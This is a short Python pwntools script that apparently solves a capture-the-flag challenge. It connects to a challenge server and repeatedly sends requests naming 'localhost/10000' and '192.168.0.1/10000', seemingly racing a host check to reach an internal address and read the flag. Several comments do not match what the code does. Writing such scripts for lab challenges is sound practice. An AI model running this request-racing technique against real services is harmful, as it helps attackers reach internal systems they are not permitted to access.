from pwn import *

# Connect to the challenge server
conn = remote('up.zoolab.org', 10932)


# Function to send a command and check if "flag" is in the response
def send_command_and_check():
    conn.sendline("g")
    conn.sendline("localhost/10000")
    conn.sendline("g")
    conn.sendline("192.168.0.1/10000")

# Crafted file name to access the flag file
#crafted_fname = "g"

# Continuously send commands until flag is outputted
for i in range(30):
    # Send a command to read the crafted file
    send_command_and_check()

conn.interactive()
# Close the connection
conn.close()
